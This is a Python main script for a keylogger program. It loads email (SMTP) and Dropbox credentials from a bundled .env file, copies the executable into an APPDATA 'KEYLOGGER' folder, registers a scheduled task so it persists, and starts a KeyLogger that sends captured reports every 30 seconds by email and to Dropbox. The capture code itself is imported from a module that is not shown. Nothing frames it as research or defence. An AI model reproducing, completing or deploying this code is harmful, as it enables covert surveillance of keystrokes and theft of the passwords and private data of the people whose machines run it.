import os
import sys
import tempfile

from dotenv import load_dotenv
from keylogger import KeyLogger
from utils import is_process_running

# When compiled with PyInstaller, the .env is extracted to sys._MEIPASS.
# When running as a plain .py, load it from the script's directory.
if getattr(sys, "frozen", False):
    _env_path = os.path.join(sys._MEIPASS, ".env")
else:
    _env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
load_dotenv(_env_path)

SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = os.getenv("SMTP_PORT")
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
EMAIL_CC = os.getenv("EMAIL_CC")
DROPBOX_APP_KEY = os.getenv("DROPBOX_APP_KEY")
DROPBOX_APP_SECRET = os.getenv("DROPBOX_APP_SECRET")
DROPBOX_REFRESH_TOKEN = os.getenv("DROPBOX_REFRESH_TOKEN")

SEND_REPORT_EVERY = 30  # seconds
MAGIC_WORD = "stop"

EXE_FILENAME = "main.exe"

# Identify the executable path regardless of where it is run from (e.g. USB drive)
# sys.executable is used when compiled with PyInstaller, __file__ otherwise
SRC_FILE = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)

# Fallback to system temp folder if APPDATA is not available
_appdata = os.getenv("APPDATA") or tempfile.gettempdir()
DEST_FOLDER = os.path.join(_appdata, "KEYLOGGER")

SCHEDULED_TASK_NAME = "TASK_NAME"


def main():
    try:
        running_instances = is_process_running(EXE_FILENAME)
        print(f"Number of '{EXE_FILENAME}' ongoing processes: {running_instances}")
        if running_instances >= 4:
            print("Too many ongoing processes. Exiting.")
            return
    except Exception as e:
        print(f"[main] WARNING - Could not check running instances: {e}")

    try:
        keylogger = KeyLogger(
            time_interval=SEND_REPORT_EVERY,
            smtp_server=SMTP_SERVER,
            smtp_port=SMTP_PORT,
            email_address=EMAIL_ADDRESS,
            email_password=EMAIL_PASSWORD,
            email_sender=EMAIL_SENDER,
            email_receiver=EMAIL_RECEIVER,
            cc=EMAIL_CC,
            magic_word=MAGIC_WORD,
            dropbox_app_key=DROPBOX_APP_KEY,
            dropbox_app_secret=DROPBOX_APP_SECRET,
            dropbox_refresh_token=DROPBOX_REFRESH_TOKEN,
            src_file=SRC_FILE,
            dest_folder=DEST_FOLDER,
            scheduled_task_name=SCHEDULED_TASK_NAME,
        )
        keylogger.run()
    except Exception as e:
        print(f"[main] FATAL - Unhandled exception: {e}")


if __name__ == "__main__":
    main()
